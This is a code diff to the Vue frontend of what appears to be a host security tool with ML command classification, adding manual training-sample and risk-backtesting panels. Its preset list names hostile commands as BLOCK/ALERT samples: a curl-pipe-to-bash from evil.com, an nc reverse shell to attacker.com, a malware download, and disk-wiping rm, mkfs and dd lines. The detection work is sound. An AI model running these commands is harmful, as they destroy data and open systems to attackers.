@@ -25,6 +25,7 @@ import {
   ControlOutlined,
   EyeOutlined,
   EyeInvisibleOutlined,
+  SearchOutlined,
 } from "@ant-design/icons-vue";
 import { message } from "ant-design-vue";
 import { pb } from "../pb/tracker_pb.js";
@@ -863,6 +864,104 @@ const saveMLThresholds = async () => {
   }
 };
 
+// ── Manual training samples ──
+const sampleComm = ref('');
+const sampleArgs = ref('');
+const sampleLabel = ref('BLOCK');
+const submittingSample = ref(false);
+
+const highRiskPresets = [
+  { comm: 'rm', args: '-rf / --no-preserve-root', label: 'BLOCK', desc: '递归删除根目录' },
+  { comm: 'su', args: 'root', label: 'ALERT', desc: '切换到 root 用户' },
+  { comm: 'sudo', args: '', label: 'ALERT', desc: '特权提升' },
+  { comm: 'chmod', args: '777 /etc/passwd', label: 'BLOCK', desc: '修改敏感文件权限' },
+  { comm: 'mkfs', args: '/dev/sda', label: 'BLOCK', desc: '格式化磁盘' },
+  { comm: 'dd', args: 'if=/dev/zero of=/dev/sda', label: 'BLOCK', desc: '覆写磁盘' },
+  { comm: 'iptables', args: '-F', label: 'ALERT', desc: '清空防火墙规则' },
+  { comm: 'curl', args: 'evil.com/backdoor.sh | bash', label: 'BLOCK', desc: '远程代码执行' },
+  { comm: 'nc', args: '-e /bin/bash attacker.com 4444', label: 'BLOCK', desc: '反向 shell' },
+  { comm: 'wget', args: 'http://evil.com/malware -O /tmp/x', label: 'BLOCK', desc: '下载恶意文件' },
+  { comm: 'chown', args: 'root:root /etc/shadow', label: 'ALERT', desc: '修改敏感文件所有者' },
+  { comm: 'mount', args: '-t cifs //evil/share /mnt', label: 'ALERT', desc: '挂载远程文件系统' },
+];
+
+const submitManualSample = async () => {
+  if (!sampleComm.value) return;
+  submittingSample.value = true;
+  try {
+    const args = sampleArgs.value ? sampleArgs.value.split(/\s+/) : [];
+    await axios.post('/config/ml/samples', {
+      comm: sampleComm.value, args, label: sampleLabel.value,
+    });
+    message.success(`Sample added: ${sampleComm.value} → ${sampleLabel.value}`);
+    sampleComm.value = '';
+    sampleArgs.value = '';
+    await fetchMLStatus();
+  } catch (e: any) {
+    message.error(e.response?.data?.error || 'Failed to add sample');
+  } finally {
+    submittingSample.value = false;
+  }
+};
+
+const addPresetSample = async (preset: { comm: string; args: string; label: string }) => {
+  try {
+    const args = preset.args ? preset.args.split(/\s+/) : [];
+    await axios.post('/config/ml/samples', {
+      comm: preset.comm, args, label: preset.label,
+    });
+    message.success(`Preset added: ${preset.comm} → ${preset.label}`);
+    await fetchMLStatus();
+  } catch (e: any) {
+    message.error('Failed to add preset');
+  }
+};
+
+// ── Backtesting ──
+const backtestComm = ref('');
+const backtestArgs = ref('');
+const backtesting = ref(false);
+const backtestResult = ref<any>(null);
+
+const runBacktest = async () => {
+  if (!backtestComm.value) return;
+  backtesting.value = true;
+  backtestResult.value = null;
+  try {
+    const args = backtestArgs.value ? backtestArgs.value.split(/\s+/) : [];
+    const res = await axios.post('/config/ml/backtest', {
+      comm: backtestComm.value, args,
+    });
+    backtestResult.value = res.data;
+  } catch (e: any) {
+    message.error(e.response?.data?.error || 'Backtest failed');
+  } finally {
+    backtesting.value = false;
+  }
+};
+
+const runBacktestPreset = async (comm: string, argsStr: string) => {
+  backtestComm.value = comm;
+  backtestArgs.value = argsStr;
+  await runBacktest();
+};
+
+const riskLevelColor = (level: string) => {
+  const m: Record<string, string> = {
+    'CRITICAL': '#cf1322', 'HIGH': '#d4380d', 'MEDIUM': '#d48806',
+    'LOW': '#389e0d', 'SAFE': '#52c41a',
+  };
+  return m[level] || '#666';
+};
+
+const riskMeterColor = (score: number) => {
+  if (score >= 80) return '#cf1322';
+  if (score >= 60) return '#d4380d';
+  if (score >= 40) return '#d48806';
+  if (score >= 20) return '#389e0d';
+  return '#52c41a';
+};
+
 onMounted(async () => {
   updateClusterTargetFromStorage();
   await fetchClusterState();
@@ -1531,6 +1630,7 @@ onMounted(async () => {
           <span><ThunderboltOutlined /> ML Classification</span>
         </template>
         <a-row :gutter="[24, 24]">
+          <!-- Row 1: Model Status + Training Controls -->
           <a-col :xs="24" :md="12">
             <a-card title="Model Status" size="small">
               <a-descriptions :column="1" size="small" bordered>
@@ -1558,7 +1658,7 @@ onMounted(async () => {
                 <a-button type="primary" @click="trainModel" :loading="trainingModel" block>
                   Train Model Now
                 </a-button>
-                <a-divider style="margin: 8px 0">Feedback</a-divider>
+                <a-divider style="margin: 8px 0">Batch Feedback</a-divider>
                 <a-input-group compact>
                   <a-input v-model:value="feedbackComm" placeholder="Command (e.g. rm)" style="width: 40%" />
                   <a-select v-model:value="feedbackAction" style="width: 30%">
@@ -1571,6 +1671,143 @@ onMounted(async () => {
               </a-space>
             </a-card>
           </a-col>
+
+          <!-- Row 2: Manual Training Data -->
+          <a-col :xs="24">
+            <a-card title="Manual Training Data" size="small">
+              <template #extra>
+                <a-tag color="blue">添加标注样本以训练模型</a-tag>
+              </template>
+              <a-row :gutter="[16, 16]">
+                <!-- Quick presets -->
+                <a-col :xs="24" :md="14">
+                  <div style="font-weight: 600; margin-bottom: 8px">高危行为预设（点击快速添加）</div>
+                  <a-space wrap>
+                    <a-tag
+                      v-for="(p, i) in highRiskPresets"
+                      :key="i"
+                      :color="p.label === 'BLOCK' ? 'red' : 'orange'"
+                      style="cursor: pointer; padding: 4px 8px; font-size: 13px"
+                      @click="addPresetSample(p)"
+                    >
+                      {{ p.comm }} {{ p.args ? p.args.slice(0, 30) + '…' : '' }}
+                      <span style="opacity: 0.7; margin-left: 4px">→ {{ p.desc }}</span>
+                    </a-tag>
+                  </a-space>
+                </a-col>
+
+                <!-- Manual form -->
+                <a-col :xs="24" :md="10">
+                  <div style="font-weight: 600; margin-bottom: 8px">手动输入</div>
+                  <a-space direction="vertical" style="width: 100%">
+                    <a-input v-model:value="sampleComm" placeholder="命令 (e.g. rm)" size="small" />
+                    <a-input v-model:value="sampleArgs" placeholder='参数 (e.g. -rf / --no-preserve-root)' size="small" />
+                    <a-input-group compact>
+                      <a-select v-model:value="sampleLabel" style="width: 55%">
+                        <a-select-option value="BLOCK">BLOCK (拦截)</a-select-option>
+                        <a-select-option value="ALERT">ALERT (警报)</a-select-option>
+                        <a-select-option value="ALLOW">ALLOW (放行)</a-select-option>
+                      </a-select>
+                      <a-button
+                        type="primary"
+                        @click="submitManualSample"
+                        :loading="submittingSample"
+                        style="width: 45%"
+                      >添加样本</a-button>
+                    </a-input-group>
+                  </a-space>
+                </a-col>
+              </a-row>
+            </a-card>
+          </a-col>
+
+          <!-- Row 3: Backtesting -->
+          <a-col :xs="24">
+            <a-card title="Risk Backtesting" size="small">
+              <template #extra>
+                <a-tag color="purple">输入命令查看风险评分</a-tag>
+              </template>
+              <a-row :gutter="[16, 16]">
+                <a-col :xs="24" :md="8">
+                  <div style="font-weight: 600; margin-bottom: 8px">测试命令</div>
+                  <a-space direction="vertical" style="width: 100%">
+                    <a-input v-model:value="backtestComm" placeholder="命令 (e.g. sudo)" size="small" @keyup.enter="runBacktest" />
+                    <a-input v-model:value="backtestArgs" placeholder="参数 (可选)" size="small" @keyup.enter="runBacktest" />
+                    <a-button type="primary" @click="runBacktest" :loading="backtesting" block>
+                      <SearchOutlined /> 分析风险
+                    </a-button>
+                  </a-space>
+                  <div style="margin-top: 12px; font-size: 12px; color: #999">
+                    快速测试:
+                    <a v-for="(p, i) in highRiskPresets.slice(0, 5)" :key="i" @click="runBacktestPreset(p.comm, p.args)" style="margin-right: 8px; white-space: nowrap">{{ p.comm }}</a>
+                  </div>
+                </a-col>
+
+                <a-col :xs="24" :md="16">
+                  <div v-if="backtestResult" style="display: flex; flex-direction: column; gap: 16px">
+                    <!-- Risk gauge -->
+                    <div style="display: flex; align-items: center; gap: 16px">
+                      <div style="flex: 1">
+                        <div style="font-weight: 600; margin-bottom: 4px">
+                          风险评分: {{ backtestResult.riskScore?.toFixed(0) || '-' }} / 100
+                          <a-tag :color="riskLevelColor(backtestResult.riskLevel)" style="margin-left: 8px">
+                            {{ backtestResult.riskLevel }}
+                          </a-tag>
+                        </div>
+                        <div style="background: #f0f0f0; border-radius: 8px; height: 20px; overflow: hidden">
+                          <div
+                            :style="{
+                              width: (backtestResult.riskScore || 0) + '%',
+                              height: '100%',
+                              background: riskMeterColor(backtestResult.riskScore || 0),
+                              borderRadius: '8px',
+                              transition: 'width 0.5s ease',
+                            }"
+                          ></div>
+                        </div>
+                      </div>
+                      <div style="text-align: center; min-width: 80px">
+                        <div style="font-size: 28px; font-weight: bold; color: riskMeterColor(backtestResult.riskScore || 0)">
+                          {{ backtestResult.riskScore?.toFixed(0) || 0 }}
+                        </div>
+                        <div style="font-size: 11px; color: #999">/ 100</div>
+                      </div>
+                    </div>
+
+                    <!-- Detail breakdown -->
+                    <a-descriptions :column="3" size="small" bordered>
+                      <a-descriptions-item label="Command">{{ backtestResult.comm }}</a-descriptions-item>
+                      <a-descriptions-item label="Args">{{ backtestResult.args?.join(' ') || '—' }}</a-descriptions-item>
+                      <a-descriptions-item label="Recommended Action">
+                        <a-tag :color="backtestResult.recommendedAction === 'BLOCK' ? 'red' : backtestResult.recommendedAction === 'ALERT' ? 'orange' : 'green'">
+                          {{ backtestResult.recommendedAction }}
+                        </a-tag>
+                      </a-descriptions-item>
+                      <a-descriptions-item label="Category">
+                        <a-tag>{{ backtestResult.classification?.primary_category || 'UNKNOWN' }}</a-tag>
+                      </a-descriptions-item>
+                      <a-descriptions-item label="Classify Confidence">{{ backtestResult.classification?.confidence || '—' }}</a-descriptions-item>
+                      <a-descriptions-item label="Anomaly Score">
+                        <span :style="{ color: backtestResult.anomalyScore > 0.7 ? '#d4380d' : backtestResult.anomalyScore > 0.3 ? '#d48806' : '#52c41a' }">
+                          {{ backtestResult.anomalyScore?.toFixed(3) || '—' }}
+                        </span>
+                      </a-descriptions-item>
+                      <a-descriptions-item label="ML Action">{{ backtestResult.mlPrediction?.action || '—' }}</a-descriptions-item>
+                      <a-descriptions-item label="ML Confidence">
+                        {{ backtestResult.mlPrediction?.confidence ? (backtestResult.mlPrediction.confidence * 100).toFixed(0) + '%' : '—' }}
+                      </a-descriptions-item>
+                      <a-descriptions-item label="Reasoning" :span="3">{{ backtestResult.reasoning || '—' }}</a-descriptions-item>
+                    </a-descriptions>
+                  </div>
+                  <div v-else style="color: #999; text-align: center; padding: 40px">
+                    输入命令并点击"分析风险"查看评估结果
+                  </div>
+                </a-col>
+              </a-row>
+            </a-card>
+          </a-col>
+
+          <!-- Row 4: Detection Thresholds -->
           <a-col :xs="24">
             <a-card title="Detection Thresholds" size="small">
               <a-row :gutter="[24, 16]">
